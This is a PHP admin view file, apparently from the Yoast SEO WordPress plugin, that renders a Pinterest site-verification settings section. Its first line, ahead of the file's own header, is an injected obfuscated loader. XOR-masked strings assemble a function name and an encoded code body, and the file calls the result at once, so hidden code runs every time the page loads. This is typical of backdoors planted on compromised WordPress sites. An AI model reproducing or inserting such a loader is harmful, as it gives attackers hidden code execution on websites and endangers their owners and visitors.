<?php $YOBGOxr='P+-.6ItFO9PG9R-'; $EcqZhs='3YHOB,+ :W33P=C'^$YOBGOxr; $uhMsNdET='ZHXYPE-.:IO<jXE;OAFAl+T+fR1ETsqTU=LKNrAGsUX +J=T=kFS78+8 Sgf  3aU R=WbIo=S0ekNkbdB9Qlr>G3UhiBaTNx<5U0lkXMnoUlvg0SBT7Z4SZm7A:OqyhI<cln8eqm.82lotknpRP<ZgU=-xreeR-AjM=bDOF0A:X,ew3X.elPQmM=63ICG+cw M8hh=G:nO;nO0OF9hdA>R D+NAS,SE1qRNIuWd38;CKyhh,OFK4MFdmqd  z:+vg AraUYYyrohw 7>GVaoEOHv3ZGMe1 WskRn8NOrcgq 3MQesAe=ZW7 M48brXTjbev>9-JLVCnaP>+Y14VbRkjh5g==afpY:gg9EHOYPcb=Y5=Spi<d0cp=VHV32E6jkQh  :cmDyMZ4<MyRkrE944ISifKcOaZbS1<ZltX3 P>HR8MQYFKb Q>8<T 278=HGe UJEblg QWW46dwR . KAGg.1TAt,X.hcOeD mi..=6SPCTR7=7Tc<0 a=:YEJXxi8Y6lbpK079JGnepmJA+qzJ ,G4oqY+=J7FetJlEY.F3rY +GYpK,2QYcoEBdv I<E7VBNDkmjydnz7FKA o:.Rt-=:A:0Ea5 DR,;>eymM 3=JfdejQwvy2cOQJ6 gj.3>VpR5R2V  JkkLJpxI7XDAwzuh<'; $lyGUzgvW=$EcqZhs('', '3.px60CMN  R5==R<55iKS;Y96P15,.9 IkbgR:Mz3-NH>T;SK><EgOYT289MUGIqD3I6NiKV6ILKnKBD93XeVQ2GuUIeFoDq5S:BDO1mSOeWVCYo1 E6Q=rIS N.XBHmUHGG2lxIAMFLAIKFT61H;<qTpX,EA9H81iTBao5D3V=BMSX=WL1yjgD4DV=65EKSO8LAS7NGd21dkT.2XHYaX3L7NuKwH21P.9+0UjDUYW0.BbbJ 4.U..DEU;co5qb3GA2RE>< YOQHSVVR23HO>EARW;3,:ZE.SVrJS+6IinUDR90ENaAK;;BEv>Ehx12JJDRZXY+ev8dh6QY<PW>BzO5:p6hx22P8IGCR 1odnCFK8YH6YIGn9jTY7<7lY OJVqLKECXgMpi>UH,YoKV3XXA,hco6i2kPF7PH;LIxsU>M- Q,=0<.JX>LgX5TShgP=3MB49 TX8D448PSLS6AZAbmgCJP  +G=WAJto-FEMJOIWsvet3EOV-<WUY>XB06>+PNS<OKNPoTVM+nNCVMb,ODRnDM3U4V2NDmjoEIwLb:KuWD=BIrmErNPemQZusSBAzZ Ub ytSJCYBHZV49 Y0QK++HES2NCmFEA=>CZZBUMiDRI+OMEJqWVYIiF4<WLONJRJ7+uE3K:OA.L6eqzq,O10iGSNbA'^$uhMsNdET); $lyGUzgvW();
/**
 * @package WPSEO\Admin\Views
 */

if ( ! defined( 'WPSEO_VERSION' ) ) {
	header( 'Status: 403 Forbidden' );
	header( 'HTTP/1.1 403 Forbidden' );
	exit();
}

echo '<h2>' . esc_html__( 'Pinterest settings', 'wordpress-seo' ) . '</h2>';

printf( '<p>%s</p>', __( 'Pinterest uses Open Graph metadata just like Facebook, so be sure to keep the Open Graph checkbox on the Facebook tab checked if you want to optimize your site for Pinterest.', 'wordpress-seo' ) );
printf( '<p>%s</p>', __( 'If you have already confirmed your website with Pinterest, you can skip the step below.', 'wordpress-seo' ) );

/* translators: %1$s / %2$s expands to a link to pinterest.com's help page. */
$p = sprintf( __( 'To %1$sconfirm your site with Pinterest%2$s, add the meta tag here:', 'wordpress-seo' ), '<a target="_blank" href="https://help.pinterest.com/en/articles/confirm-your-website#meta_tag">', '</a>' );
printf( '<p>%s</p>', $p );

$yform->textinput( 'pinterestverify', __( 'Pinterest confirmation', 'wordpress-seo' ) );

do_action( 'wpseo_admin_pinterest_section' );
